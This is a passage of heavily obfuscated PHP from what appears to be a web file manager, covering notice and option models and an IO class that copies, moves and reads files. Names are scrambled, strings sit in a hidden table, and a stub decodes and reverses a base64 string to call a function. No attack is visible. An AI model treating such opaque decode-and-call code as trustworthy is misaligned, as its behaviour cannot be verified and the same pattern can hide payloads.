$Òíğ±»Ñ = array($İÉ†öÒ£[492] => array($İÉ†öÒ£[7], array_unique($Û›èÊ…))); $this->where($Òíğ±»Ñ)->delete(); } public function deviceList($Ãû»ëÀà, $–äò”³ = 0) { $Ü¨ªĞ =& $_SERVER[áäÒ½¯Ç]; $¥æ›Ü±“ = array($Ü¨ªĞ[1542] => $Ãû»ëÀà, $Ü¨ªĞ[242] => array($Ü¨ªĞ[1130], $–äò”³), $Ü¨ªĞ[33] => $Ü¨ªĞ[2079]); $ùĞÒªãË = array(); $Ä†ÌªÛœ = $this->field($Ü¨ªĞ[2609])->where($¥æ›Ü±“)->order($Ü¨ªĞ[2381])->limit(50)->select(); foreach ($Ä†ÌªÛœ as $•ÆĞ¶ôã => $è§¨ÂÄÃ) { if ($•ÆĞ¶ôã > 0 && abs($è§¨ÂÄÃ[$Ü¨ªĞ[242]] - $Ä†ÌªÛœ[$•ÆĞ¶ôã - 1][$Ü¨ªĞ[242]]) < 5) { continue; } $¤‚¬¾¢Ó = json_decode($è§¨ÂÄÃ[$Ü¨ªĞ[545]], !0); $è§¨ÂÄÃ[$Ü¨ªĞ[1558]] = isset($¤‚¬¾¢Ó[$Ü¨ªĞ[1558]]) ? $¤‚¬¾¢Ó[$Ü¨ªĞ[1558]] : $Ü¨ªĞ[12]; unset($¤‚¬¾¢Ó[$Ü¨ªĞ[1558]]); $Ë™Œó€­ = $this->deviceType($¤‚¬¾¢Ó[$Ü¨ªĞ[2371]]); if (isset($ùĞÒªãË[$Ë™Œó€­])) { continue; } $è§¨ÂÄÃ[$Ü¨ªĞ[2604]] = IpLocation::get($è§¨ÂÄÃ[$Ü¨ªĞ[1558]]); $è§¨ÂÄÃ[$Ü¨ªĞ[545]] = $¤‚¬¾¢Ó; $ùĞÒªãË[$Ë™Œó€­] = $è§¨ÂÄÃ; } return array_values($ùĞÒªãË); } public function deviceType($…¥Úä¡î) { return $…¥Úä¡î; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\x6e\157\164\x69\143\x65\x4c\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\143\x6f\156\x74\145\x6e\164", "\141\x75\x74\x68", "\155\x6f\144\145", "\164\x69\x6d\145", "\164\171\x70\145", "\x6c\145\x76\x65\x6c", "\x65\156\141\142\154\145", "\163\157\162\164"); public function listData($µ÷­®âœ = false, $¯å¿»¬ = "\163\157\162\x74", $´Šü˜Û† = false) { return parent::listData($µ÷­®âœ, $¯å¿»¬, $´Šü˜Û†); } public function add($àû‚»­ì) { $ç¼«úâÑ =& $_SERVER[áäÒ½¯Ç]; $Ôüî³Ÿ = time(); if ($àû‚»­ì[$ç¼«úâÑ[16]] == $ç¼«úâÑ[2610]) { $Ôüî³Ÿ = strtotime($àû‚»­ì[$ç¼«úâÑ[205]]); } $àû‚»­ì[$ç¼«úâÑ[205]] = $Ôüî³Ÿ; return parent::insert($àû‚»­ì); } public function update($àŠÔ„½¦, $©Ø×‡Ò) { $‚Î‰×î˜ =& $_SERVER[áäÒ½¯Ç]; $™Æ¿ï¨ = $this->listData($àŠÔ„½¦); if (!$™Æ¿ï¨) { return !1; } $Ú­Ğ™Å˜ = time(); if ($©Ø×‡Ò[$‚Î‰×î˜[16]] == $‚Î‰×î˜[2610]) { $Ú­Ğ™Å˜ = strtotime($©Ø×‡Ò[$‚Î‰×î˜[205]]); } $©Ø×‡Ò[$‚Î‰×î˜[205]] = $Ú­Ğ™Å˜; return parent::update($àŠÔ„½¦, $©Ø×‡Ò); } public function remove($“ˆšù‘Â) { $ûìÓı§ = $this->listData($“ˆšù‘Â); if (!$ûìÓı§ || $ûìÓı§[$_SERVER[áäÒ½¯Ç][190]]) { return !1; } return parent::remove($“ˆšù‘Â); } public function sort($ºÆÈ¿¿±, $Ëí„¤—) { return parent::update($ºÆÈ¿¿±, $Ëí„¤—); } public function enable($ÛÍ©µë¿, $ø®óãÜø) { return parent::update($ÛÍ©µë¿, array($_SERVER[áäÒ½¯Ç][2611] => $ø®óãÜø)); } private function initUserOption() { $òÂâğ¤ =& $_SERVER[áäÒ½¯Ç]; $this->optionType = $òÂâğ¤[2612]; $this->modelType = $òÂâğ¤[2613]; $this->field = array($òÂâğ¤[2614], $òÂâğ¤[32], $òÂâğ¤[205], $òÂâğ¤[33], $òÂâğ¤[2615], $òÂâğ¤[852], $òÂâğ¤[237]); } public function userNoticeGet($·Òó™·› = false) { $this->initUserOption(); return parent::listData($·Òó™·›, $_SERVER[áäÒ½¯Ç][492], !0); } public function userNoticeAdd($øÌ¾óÇ) { $‰©¨ ÁÓ =& $_SERVER[áäÒ½¯Ç]; $this->initUserOption(); $¸ŠØÁè = $this->findByKey($‰©¨ ÁÓ[2614], $øÌ¾óÇ[$‰©¨ ÁÓ[492]]); if ($¸ŠØÁè) { return !0; } $Å•ÎÍÛÙ = array($‰©¨ ÁÓ[2614] => $øÌ¾óÇ[$‰©¨ ÁÓ[492]], $‰©¨ ÁÓ[32] => $øÌ¾óÇ[$‰©¨ ÁÓ[32]], $‰©¨ ÁÓ[205] => $øÌ¾óÇ[$‰©¨ ÁÓ[205]], $‰©¨ ÁÓ[33] => isset($øÌ¾óÇ[$‰©¨ ÁÓ[33]]) ? $øÌ¾óÇ[$‰©¨ ÁÓ[33]] : 1, $‰©¨ ÁÓ[2615] => isset($øÌ¾óÇ[$‰©¨ ÁÓ[2615]]) ? $øÌ¾óÇ[$‰©¨ ÁÓ[2615]] : 0, $‰©¨ ÁÓ[852] => 0, $‰©¨ ÁÓ[237] => 0); return parent::insert($Å•ÎÍÛÙ); } public function userNoticeEdit($¦ê£Ç™¾, $ê¹‡à·) { $this->initUserOption(); return parent::update($¦ê£Ç™¾, $ê¹‡à·); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\145\155\137\157\x70\164\151\x6f\x6e"; protected $jsonField = array("\155\145\156\165", "\x72\157\x6c\x65", "\x72\157\x6c\145\107\162\157\x75\x70", "\162\145\x67\x69\x73\164", "\x65\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ıôŸ¤î®) { return "\123\171\163\x74\145\155\x4f\160\164\x69\157\156\x5f{$ıôŸ¤î®}"; } protected function optionDefault($ğ×ªÍï = '') { $º†éÎºà =& $_SERVER[áäÒ½¯Ç]; if ($ğ×ªÍï == $º†éÎºà[12]) { return $GLOBALS[$º†éÎºà[6]][$º†éÎºà[477]]; } } } goto FÄö‚Ş‚†; CñĞÕ‰Ÿêß: $fileSize = strrev(base64_decode($_SERVER[Ş¤Ÿ¢à¹][0])); function binCheckNeq($’ß®İÙŒ, $Ó‚’µ„²) { return $’ß®İÙŒ != $Ó‚’µ„²; } $_SERVER[$_SERVER[Ş¤Ÿ¢à¹][1]] = $fileSize($_SERVER[$_SERVER[Ş¤Ÿ¢à¹][2]]); goto C•‘ÁªõĞ¹; C»Œš¨Ì‹: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ğöù¬›Á, $ğéµïÕ‰) { $›ÎñŞÍ› =& $_SERVER[áäÒ½¯Ç]; $§Ê‹ƒÇË = $ğéµïÕ‰; $GLOBALS[$›ÎñŞÍ›[1277]] = $›ÎñŞÍ›[1278] . $ğöù¬›Á; Hook::trigger($›ÎñŞÍ›[1278] . $ğöù¬›Á . $›ÎñŞÍ›[1279], $§Ê‹ƒÇË); $€·ş‡ = self::driverMake($ğéµïÕ‰[0]); if (!$€·ş‡) { return !1; } if ($ğöù¬›Á == $›ÎñŞÍ›[646] || $ğöù¬›Á == $›ÎñŞÍ›[648] || $ğöù¬›Á == $›ÎñŞÍ›[1280]) { if (!trim($€·ş‡->path . $›ÎñŞÍ›[472], $›ÎñŞÍ›[8])) { return !1; } } if (method_exists($€·ş‡, $ğöù¬›Á)) { $‘¡‡¬»‹ = @call_user_func_array(array($€·ş‡, $ğöù¬›Á), $ğéµïÕ‰); } else { if (method_exists($€·ş‡, $›ÎñŞÍ›[1281])) { $‘¡‡¬»‹ = @call_user_func_array(array($€·ş‡, $ğöù¬›Á), $ğéµïÕ‰); } else { if (method_exists(self, $ğöù¬›Á)) { $‘¡‡¬»‹ = @call_user_func_array(array(self, $ğöù¬›Á), $ğéµïÕ‰); } else { $‘¡‡¬»‹ = call_user_func_array(array(parent, $ğöù¬›Á), $ğéµïÕ‰); } } } Hook::trigger($›ÎñŞÍ›[1278] . $ğöù¬›Á . $›ÎñŞÍ›[1282], $§Ê‹ƒÇË, $‘¡‡¬»‹); return $‘¡‡¬»‹; } public static function init($ûªğÊ¸Î) { return self::driverMake($ûªğÊ¸Î); } public static function copy($¶çë¾Õ, $îöó º, $¶‚ùĞòÁ = false, $ß»½´îß = false) { return self::copyMoveStart($¶çë¾Õ, $îöó º, $¶‚ùĞòÁ, $_SERVER[áäÒ½¯Ç][646], $ß»½´îß); } public static function move($ª°óÜŞ°, $Ó•ôñíÍ, $ƒÂ‘ ß… = false, $ğøÑö¹‡ = false) { return self::copyMoveStart($ª°óÜŞ°, $Ó•ôñíÍ, $ƒÂ‘ ß…, $_SERVER[áäÒ½¯Ç][648], $ğøÑö¹‡); } public static function copyMoveChildren($³ëã£Çé, $´²ù‘µß, $ÜµÍó’× = "\x63\157\x70\171", $íØî¤ò = REPEAT_REPLACE) { $€‰à­¤ü =& $_SERVER[áäÒ½¯Ç]; $éŠéñ³ = $³ëã£Çé; $²ÜÏª¬à = self::driverMake($³ëã£Çé); $ˆèıé‘– = $²ÜÏª¬à->listPath($³ëã£Çé, !0); $÷¶¢‹˜İ = array_merge($ˆèıé‘–[$€‰à­¤ü[86]], $ˆèıé‘–[$€‰à­¤ü[85]]); foreach ($÷¶¢‹˜İ as $ã‘ŸšĞ×) { self::copyMoveStart($ã‘ŸšĞ×[$€‰à­¤ü[87]], $´²ù‘µß, $íØî¤ò, $ÜµÍó’×, !1); } if ($ÜµÍó’× == $€‰à­¤ü[648]) { self::remove($éŠéñ³); } } private static function copyMoveStart($ğõƒ­›è, $³³½éØö, $úûÇ¥‚, $ı‘ÅŠêÕ, $¸çÁš¿‰) { $Îš£›‘é =& $_SERVER[áäÒ½¯Ç]; $®Û¨í©Æ = array($ğõƒ­›è, $³³½éØö, $úûÇ¥‚, $¸çÁš¿‰); Hook::trigger($Îš£›‘é[1278] . $ı‘ÅŠêÕ . $Îš£›‘é[1279], $®Û¨í©Æ); $ˆÜ±íæ… = self::copyMove($ğõƒ­›è, $³³½éØö, $úûÇ¥‚, $ı‘ÅŠêÕ, $¸çÁš¿‰); Hook::trigger($Îš£›‘é[1278] . $ı‘ÅŠêÕ . $Îš£›‘é[1282], $®Û¨í©Æ, $ˆÜ±íæ…); return $ˆÜ±íæ…; } public static function saveFile($âêäÅîØ, $œä¡úéğ, $›ÇÙŞí‰ = true) { $êÄš¸†Æ =& $_SERVER[áäÒ½¯Ç]; $€± ²‘¬ = self::info($œä¡úéğ); $Ó¹‹âÖœ = self::driverMake($âêäÅîØ); $Œ±¥×àÔ = self::driverMake($œä¡úéğ); $Æ¤Ø¢¨ì = !1; if ($Œ±¥×àÔ->pathParse[$êÄš¸†Æ[1283]]) { $Æ¤Ø¢¨ì = $Œ±¥×àÔ; $şŒ£Š²è = $Œ±¥×àÔ->pathParse[$êÄš¸†Æ[1283]]; $Œ±¥×àÔ = self::driverMake($şŒ£Š²è); } if ($Ó¹‹âÖœ->pathParse[$êÄš¸†Æ[1283]]) { $È¾Ñçå‘ = $Ó¹‹âÖœ->pathParse[$êÄš¸†Æ[1283]]; $Ó¹‹âÖœ = self::driverMake($È¾Ñçå‘); } $ğÇçêº = $Œ±¥×àÔ->pathFather($œä¡úéğ); $ÑëĞøÒ = !0; if (!$›ÇÙŞí‰ && self::driverIsSame($Ó¹‹âÖœ, $Œ±¥×àÔ)) { $ÑëĞøÒ = !1; } $íúÎêÆÔ = self::copyFile($Ó¹‹âÖœ, $âêäÅîØ, $Œ±¥×àÔ, $ğÇçêº, $€± ²‘¬[$êÄš¸†Æ[32]], $ÑëĞøÒ); if ($Æ¤Ø¢¨ì) { $íúÎêÆÔ = $Æ¤Ø¢¨ì->getPathOuter($íúÎêÆÔ); } return $íúÎêÆÔ; } private static function copyMove($ØæÜù, $Ûä¡Éì, $»–§ÍÁë, $ÅúñÕƒ, $®ÓÕ®¡ = false) { $´­œ‹¶ =& $_SERVER[áäÒ½¯Ç]; if (!$ØæÜù || $ØæÜù == $´­œ‹¶[8] || !$Ûä¡Éì) { return !1; } ignore_timeout(); $µ«ªÈ±ò = self::driverMake($ØæÜù); $Ã±†¯Ê£ = self::driverMake($Ûä¡Éì); $¢áâ¯Ší = $ÅúñÕƒ == $´­œ‹¶[648]; $¹£õÛ¼ = !1; if ($Ã±†¯Ê£->pathParse[$´­œ‹¶[1283]]) { $¹£õÛ¼ = $Ã±†¯Ê£; $Ûä¡Éì = $Ã±†¯Ê£->pathParse[$´­œ‹¶[1283]]; $Ã±†¯Ê£ = self::driverMake($Ûä¡Éì); } if ($µ«ªÈ±ò->pathParse[$´­œ‹¶[1283]]) { $ØæÜù = $µ«ªÈ±ò->pathParse[$´­œ‹¶[1283]]; $µ«ªÈ±ò = self::driverMake($ØæÜù); } self::check($µ«ªÈ±ò, $ØæÜù, $Ã±†¯Ê£, $Ûä¡Éì); Hook::trigger($´­œ‹¶[1284], $µ«ªÈ±ò, $ØæÜù, $Ã±†¯Ê£, $Ûä¡Éì); $×ÔšÓ¹Ç = self::driverIsSame($µ«ªÈ±ò, $Ã±†¯Ê£); if ($×ÔšÓ¹Ç) { if ($ÅúñÕƒ == $´­œ‹¶[648] && !method_exists($Ã±†¯Ê£, $´­œ‹¶[1285]) && trim($Ûä¡Éì, $´­œ‹¶[8]) == trim($Ã±†¯Ê£->pathFather($ØæÜù), $´­œ‹¶[8])) { if ($µ«ªÈ±ò->pathThis($ØæÜù) != $®ÓÕ®¡ && !$µ«ªÈ±ò->isOsDriver()) { return $µ«ªÈ±ò->rename($ØæÜù, $®ÓÕ®¡); } return $Ã±†¯Ê£->getPathOuter($ØæÜù); } if (method_exists($Ã±†¯Ê£, $ÅúñÕƒ)) { return $Ã±†¯Ê£->{$ÅúñÕƒ}($ØæÜù, $Ûä¡Éì, $»–§ÍÁë, $®ÓÕ®¡); } } if ($×ÔšÓ¹Ç && $ÅúñÕƒ == $´­œ‹¶[648] && $Ã±†¯Ê£->getType() == $´­œ‹¶[107]) { $½§›ÎÓç = $Ã±†¯Ê£->movePath($ØæÜù, $Ûä¡Éì, $®ÓÕ®¡); if ($½§›ÎÓç) { return $½§›ÎÓç; } } $¯üŞ¤Ö™ = $µ«ªÈ±ò->isFile($ØæÜù); if (!$¯üŞ¤Ö™ && $Ã±†¯Ê£->getType() == $´­œ‹¶[860] && $µ«ªÈ±ò->getType() == $´­œ‹¶[107]) { $½§›ÎÓç = $Ã±†¯Ê£->copyFolderFromIO($µ«ªÈ±ò, $ØæÜù, $Ûä¡Éì, $»–§ÍÁë, $¢áâ¯Ší, $®ÓÕ®¡); } else { $½§›ÎÓç = self::copyPath($µ«ªÈ±ò, $ØæÜù, $Ã±†¯Ê£, $Ûä¡Éì, $»–§ÍÁë, $¢áâ¯Ší, $¯üŞ¤Ö™, $®ÓÕ®¡); } if ($½§›ÎÓç && $¢áâ¯Ší) { $µ«ªÈ±ò->remove($ØæÜù); } if ($¹£õÛ¼) { $½§›ÎÓç = $¹£õÛ¼->getPathOuter($½§›ÎÓç); } return $½§›ÎÓç; } private static function check($¯æš·ïá, $–Øöıì±, $ù°¸®İ, &$‹ƒÓÖÜ¡) { $‹•´˜»Ö =& $_SERVER[áäÒ½¯Ç]; if (self::driverIsSame($¯æš·ïá, $ù°¸®İ) && $¯æš·ïá->isFolder($–Øöıì±) && $¯æš·ïá->isParentOf($–Øöıì±, $‹ƒÓÖÜ¡)) { show_json(LNG($‹•´˜»Ö[1286]), !1); } if (!$¯æš·ïá->exist($–Øöıì±)) { show_json(LNG($‹•´˜»Ö[106]), !1); } } private static function copyPath($óçó˜‰, $ ñªÌ¾, $îØà »İ, $ÒŒªŠ, $‡èó¦÷, $ï½â¾, $ºŠ¨ñïş, $¯ŞôàÌµ = false, $Ò­·Ë»§ = true) { $¹‡­…îÛ =& $_SERVER[áäÒ½¯Ç]; $™ğ¦Ñë² = empty($¯ŞôàÌµ) && $¯ŞôàÌµ !== $¹‡­…îÛ[239] ? $óçó˜‰->pathThis($ ñªÌ¾) : $¯ŞôàÌµ; if ($‡èó¦÷) { $¬¼Çëªô = $îØà »İ->fileNameExist($ÒŒªŠ, $™ğ¦Ñë²); $Ê¡èŞİ’ = $™ğ¦Ñë²; $™ğ¦Ñë² = $îØà »İ->fileNameAuto($ÒŒªŠ, $™ğ¦Ñë², $‡èó¦÷, !$ºŠ¨ñïş); if (!$¬¼Çëªô || $Ê¡èŞİ’ != $™ğ¦Ñë²) { $‡èó¦÷ = !1; } if ($Ò­·Ë»§ && !$‡èó¦÷) { $îØà »İ->_data[$¹‡­…îÛ[1287]] = !0; } } if ($ºŠ¨ñïş) { return self::copyFile($óçó˜‰, $ ñªÌ¾, $îØà »İ, $ÒŒªŠ, $™ğ¦Ñë², $ï½â¾); } if ($‡èó¦÷ == REPEAT_RENAME_FOLDER) { $‡èó¦÷ = !1; } $™µÌÜ  = rtrim($ÒŒªŠ, $¹‡­…îÛ[8]) . $¹‡­…îÛ[8] . $™ğ¦Ñë²; $Ï¢Øìû” = $îØà »İ->mkdir($îØà »İ->getPath($™µÌÜ ), $‡èó¦÷); $ÒŒªŠ = $îØà »İ->getPathInner($Ï¢Øìû”); $³«ÓµÏŞ = $óçó˜‰->listPath($ ñªÌ¾, !0); $³«ÓµÏŞ = is_array($³«ÓµÏŞ) ? $³«ÓµÏŞ : array($¹‡­…îÛ[86] => array(), $¹‡­…îÛ[85] => array()); $³Úµàˆ = array_merge($³«ÓµÏŞ[$¹‡­…îÛ[86]], $³«ÓµÏŞ[$¹‡­…îÛ[85]]); foreach ($³Úµàˆ as $Èß‰¤Š¬) { $şöÍŒ™Ò = $Èß‰¤Š¬[$¹‡­…îÛ[33]] == $¹‡­…îÛ[241]; $ ñªÌ¾ = $óçó˜‰->getPathInner($Èß‰¤Š¬[$¹‡­…îÛ[87]]); $™ŠËï›œ = self::copyPath($óçó˜‰, $ ñªÌ¾, $îØà »İ, $ÒŒªŠ, $‡èó¦÷, $ï½â¾, $şöÍŒ™Ò, !1, !1); if (!$™ŠËï›œ) { IO::errorTips($¹‡­…îÛ[1288] . $ ñªÌ¾ . $¹‡­…îÛ[73] . $ÒŒªŠ); } } self::copyMoveKeepInfo($óçó˜‰, $ ñªÌ¾, $Ï¢Øìû”); return $Ï¢Øìû”; } private static function copyFile($æ–ò†æ, $ä»–ÆäÜ, $â Û…‚, $™Ï‚œ¼£, $®¦Í¦¤Ô, $ç¨ˆ†ñ) { $‚Å¶¹Å =& $_SERVER[áäÒ½¯Ç]; $™Ï‚œ¼£ = $â Û…‚->getPath(rtrim($™Ï‚œ¼£, $‚Å¶¹Å[8]) . $‚Å¶¹Å[8] . $®¦Í¦¤Ô); $£ı¬…æó = $‚Å¶¹Å[1289] . time() . rand_string(5); Hook::trigger($‚Å¶¹Å[1290], $æ–ò†æ, $ä»–ÆäÜ, $â Û…‚, $™Ï‚œ¼£, $®¦Í¦¤Ô, $£ı¬…æó); if (self::driverIsSame($æ–ò†æ, $â Û…‚)) { if ($ç¨ˆ†ñ) { $˜°‘Æª¿ = $â Û…‚->moveFile($ä»–ÆäÜ, $™Ï‚œ¼£); } else { $˜°‘Æª¿ = $â Û…‚->copyFile($ä»–ÆäÜ, $™Ï‚œ¼£); } Hook::trigger($‚Å¶¹Å[1291], $æ–ò†æ, $ä»–ÆäÜ, $â Û…‚, $™Ï‚œ¼£, $®¦Í¦¤Ô, $˜°‘Æª¿); self::copyMoveKeepInfo($æ–ò†æ, $ä»–ÆäÜ, $˜°‘Æª¿); return $˜°‘Æª¿; } $ƒ‚œ—ô = TEMP_FILES; if ($GLOBALS[$‚Å¶¹Å[6]][$‚Å¶¹Å[92]][$‚Å¶¹Å[903]]) { $ƒ‚œ—ô = $GLOBALS[$‚Å¶¹Å[6]][$‚Å¶¹Å[92]][$‚Å¶¹Å[903]]; } $«ôÒ³åı = $ƒ‚œ—ô; mk_dir($«ôÒ³åı); $ÏöŞç‡ = $«ôÒ³åı . $£ı¬…æó; $Áß‘†« = $ÏöŞç‡; $ÏöŞç‡ = $æ–ò†æ->download($ä»–ÆäÜ, $ÏöŞç‡); $ÏöŞç‡ = $æ–ò†æ->iconvApp($ÏöŞç‡); if (substr($ÏöŞç‡, strlen($ƒ‚œ—ô)) == $ƒ‚œ—ô) { $ç¨ˆ†ñ = !0; } $˜°‘Æª¿ = $â Û…‚->upload($™Ï‚œ¼£, $ÏöŞç‡, $ç¨ˆ†ñ); self::remove($Áß‘†«); Hook::trigger($‚Å¶¹Å[1291], $æ–ò†æ, $ä»–ÆäÜ, $â Û…‚, $™Ï‚œ¼£, $®¦Í¦¤Ô, $˜°‘Æª¿); self::copyMoveKeepInfo($æ–ò†æ, $ä»–ÆäÜ, $˜°‘Æª¿); return $˜°‘Æª¿; } private static function copyMoveKeepInfo($†š¾ß†ü, $Ëƒ´êÑã, $è¹œ‘ÖÉ) { if (!$è¹œ‘ÖÉ) { return; } $Ñ©¦Ãè = $†š¾ß†ü->info($Ëƒ´êÑã); if (!is_array($Ñ©¦Ãè)) { return; } IO::setModifyTime($è¹œ‘ÖÉ, $Ñ©¦Ãè[$_SERVER[áäÒ½¯Ç][88]]); } public static function pathFather($—üĞ±†Ë) { $·›èü¸„ = IO::init($—üĞ±†Ë); $´øòó = $·›èü¸„->pathFather($·›èü¸„->path); return $·›èü¸„->getPathOuter($´øòó); } public static function fileOut($™£Õ¸Ù, $Õ…±Åªµ = false, $Šù°¡¡« = false, $ßñÆ«¢® = '') { $Ã®¥ğéË = self::driverMake($™£Õ¸Ù); if ($Ã®¥ğéË->isFileOutServer()) { return $Ã®¥ğéË->fileOutServer($™£Õ¸Ù, $Õ…±Åªµ, $Šù°¡¡«, $ßñÆ«¢®); } return $Ã®¥ğéË->fileOut($™£Õ¸Ù, $Õ…±Åªµ, $Šù°¡¡«, $ßñÆ«¢®); } public static function fileOutImage($¥¡Â¢ö, $êÛ‚Íù• = 250) { $ìóàùÈñ = array(250, 600, 1200, 2000, 3000, 5000); for ($û¶ÌÅ’» = 0; $û¶ÌÅ’» < count($ìóàùÈñ); $û¶ÌÅ’»++) { if ($û¶ÌÅ’» == 0 && $êÛ‚Íù• <= $ìóàùÈñ[$û¶ÌÅ’»]) { $êÛ‚Íù• = $ìóàùÈñ[$û¶ÌÅ’»]; break; } else { if ($êÛ‚Íù• > $ìóàùÈñ[$û¶ÌÅ’» - 1] && $êÛ‚Íù• <= $ìóàùÈñ[$û¶ÌÅ’»]) { $êÛ‚Íù• = $ìóàùÈñ[$û¶ÌÅ’»]; break; } else { if ($û¶ÌÅ’» == count($ìóàùÈñ) - 1 && $êÛ‚Íù• > $ìóàùÈñ[$û¶ÌÅ’»]) { $êÛ‚Íù• = $ìóàùÈñ[$û¶ÌÅ’»]; break; } } } } $¦¶ó»‹ = self::driverMake($¥¡Â¢ö); if ($¦¶ó»‹->isFileOutServer()) { return $¦¶ó»‹->fileOutImageServer($¥¡Â¢ö, $êÛ‚Íù•); } return $¦¶ó»‹->fileOutImage($¥¡Â¢ö, $êÛ‚Íù•); } private static function driverIsSame($ìäÊ„Ù©, $š‘®©şÛ) { $÷şõƒ×ı =& $_SERVER[áäÒ½¯Ç]; $Û£Üú ‡ = $ìäÊ„Ù©->getType(); $Ì¼¦ÌÂø = $š‘®©şÛ->getType(); if ($Û£Üú ‡ != $Ì¼¦ÌÂø) { return !1; } if ($Û£Üú ‡ == $÷şõƒ×ı[860]) { return !0; } if ($Û£Üú ‡ == $÷şõƒ×ı[107]) { return !0; } if ($ìäÊ„Ù©->pathDriver == $š‘®©şÛ->pathDriver) { return !0; } return !1; } public static function copyUpdate($²ÛŠìóÀ, $¡äí™±) { $•Şñ×¢¡ =& $_SERVER[áäÒ½¯Ç]; if (!IO::exist($²ÛŠìóÀ)) { return !1; } if (!IO::exist($¡äí™±)) { IO::mkdir($¡äí™±); } $¿šıîé = array_to_keyvalue(self::listAllSimple($²ÛŠìóÀ), $•Şñ×¢¡[87]); $Ï¨±ùœÙ = array_to_keyvalue(self::listAllSimple($¡äí™±), $•Şñ×¢¡[87]); $š ÀØÃ” = array(); $³Ÿğàºø = array(); foreach ($¿šıîé as $¯‰²ØÎÑ => $¦ÛÊŸŒú) { if (isset($Ï¨±ùœÙ[$¯‰²ØÎÑ])) { if ($¦ÛÊŸŒú[$•Şñ×¢¡[78]] == 1) { continue; } if ($Ï¨±ùœÙ[$¯‰²ØÎÑ][$•Şñ×¢¡[79]] == $¦ÛÊŸŒú[$•Şñ×¢¡[79]]) { continue; } } if ($¦ÛÊŸŒú[$•Şñ×¢¡[78]] == 1) { $³Ÿğàºø[] = $¡äí™± . $•Şñ×¢¡[8] . trim($¯‰²ØÎÑ, $•Şñ×¢¡[8]); continue; } $âï¦éÃÉ = strstr(trim($¯‰²ØÎÑ, $•Şñ×¢¡[8]), $•Şñ×¢¡[8]) ? get_path_father($¯‰²ØÎÑ) : $•Şñ×¢¡[12]; $š ÀØÃ”[] = array($•Şñ×¢¡[1292] => $¦ÛÊŸŒú[$•Şñ×¢¡[89]], $•Şñ×¢¡[1293] => rtrim($¡äí™±, $•Şñ×¢¡[8]) . $•Şñ×¢¡[8] . $âï¦éÃÉ, $•Şñ×¢¡[1294] => $¦ÛÊŸŒú); } $Š‹óüëÀ = array($•Şñ×¢¡[241] => $š ÀØÃ”, $•Şñ×¢¡[78] => $³Ÿğàºø); Hook::trigger($•Şñ×¢¡[1295], $²ÛŠìóÀ, $¡äí™±, $Š‹óüëÀ); foreach ($³Ÿğàºø as $¦ÛÊŸŒú) { IO::mkdir($¦ÛÊŸŒú); } foreach ($š ÀØÃ” as $¦ÛÊŸŒú) { IO::copy($¦ÛÊŸŒú[$•Şñ×¢¡[1292]], $¦ÛÊŸŒú[$•Şñ×¢¡[1293]], REPEAT_REPLACE); } } public static function fileSubstr($ãƒ‘ËÅô, $†¼ïşØ, $òº‰§¨ = false) { $ÚüÑ¡® =& $_SERVER[áäÒ½¯Ç]; $âÖ¼óÊÊ = self::driverMake($ãƒ‘ËÅô); $¤½±–äÖ = $âÖ¼óÊÊ->size($ãƒ‘ËÅô); $¦ˆÚ½á‰ = $†¼ïşØ; $îƒ¶Òåë = $òº‰§¨; if ($†¼ïşØ < 0) { $†¼ïşØ = $¤½±–äÖ + $†¼ïşØ; } if ($òº‰§¨ === !1) { $òº‰§¨ = $¤½±–äÖ - $†¼ïşØ; } if ($†¼ïşØ + $òº‰§¨ > $¤½±–äÖ) { $òº‰§¨ = $¤½±–äÖ - $†¼ïşØ; } if (!$¤½±–äÖ && $âÖ¼óÊÊ->getType() == $ÚüÑ¡®[107] && !$âÖ¼óÊÊ->exist($ãƒ‘ËÅô)) { $°¿õ’£ô = get_path_this($ãƒ‘ËÅô); $ìì ¯ç = parse_url_query($°¿õ’£ô); if (is_array($ìì ¯ç) && isset($ìì ¯ç[$ÚüÑ¡®[32]])) { $°¿õ’£ô = urldecode($ìì ¯ç[$ÚüÑ¡®[32]]); } throw new Exception($ÚüÑ¡®[1296] . LNG($ÚüÑ¡®[1297]) . $ÚüÑ¡®[1082] . clear_html($°¿õ’£ô) . $ÚüÑ¡®[12]); } if ($òº‰§¨ <= 0) { return $ÚüÑ¡®[12]; } if ($†¼ïşØ < 0 || $†¼ïşØ >= $¤½±–äÖ || $òº‰§¨ > $GLOBALS[$ÚüÑ¡®[6]][$ÚüÑ¡®[92]][$ÚüÑ¡®[1298]]) { throw new Exception("\146\x69\154\145\x52\145\x61\144\40\x65\x72\162\x6f\162\54\x6f\166\x65\162\x20\x69\x6f\122\x65\x61\144\x4d\x61\170\41\x20\163\x74\141\162\164\75{$†¼ïşØ}\73\x6c\x65\156\x67\164\x68\75{$òº‰§¨}\x3b\x20\x73\x69\x7a\x65\x3d{$¤½±–äÖ}\73"); } $Î’Š‰Ç† = $âÖ¼óÊÊ->fileSubstr($ãƒ‘ËÅô, $†¼ïşØ, $òº‰§¨); if (!$Î’Š‰Ç† && $òº‰§¨ && isset($GLOBALS[$ÚüÑ¡®[1299]])) { throw new Exception($GLOBALS[$ÚüÑ¡®[1299]][$ÚüÑ¡®[1300]]); } return $Î’Š‰Ç†; } private static function driverMake(&$—¶¥Í) { $º‡şˆ´Œ =& $_SERVER[áäÒ½¯Ç]; $°§¥´ÜÄ = KodIO::parse($—¶¥Í); if (!self::$driverListSystem) { $ü‹‹è¨é = Model($º‡şˆ´Œ[870])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ü‹‹è¨é, $º‡şˆ´Œ[492]); } if ($°§¥´ÜÄ[$º‡şˆ´Œ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$°§¥´ÜÄ[$º‡şˆ´Œ[492]]]) { throw new Exception($º‡şˆ´Œ[1301]); return !1; } $—¶¥Í = $°§¥´ÜÄ[$º‡şˆ´Œ[1302]]; $ÁÆ¹·Àº = self::driverGet($°§¥´ÜÄ, $—¶¥Í); return $ÁÆ¹·Àº; } private static function driverGet($Âè€µ, &$İÔÑş÷Õ) { $†ÅÈáş· =& $_SERVER[áäÒ½¯Ç]; $º‘©ë¸ = $Âè€µ[$†ÅÈáş·[1303]]; $Òı™Ğİê = $Âè€µ[$†ÅÈáş·[492]]; switch ($Âè€µ[$†ÅÈáş·[33]]) { 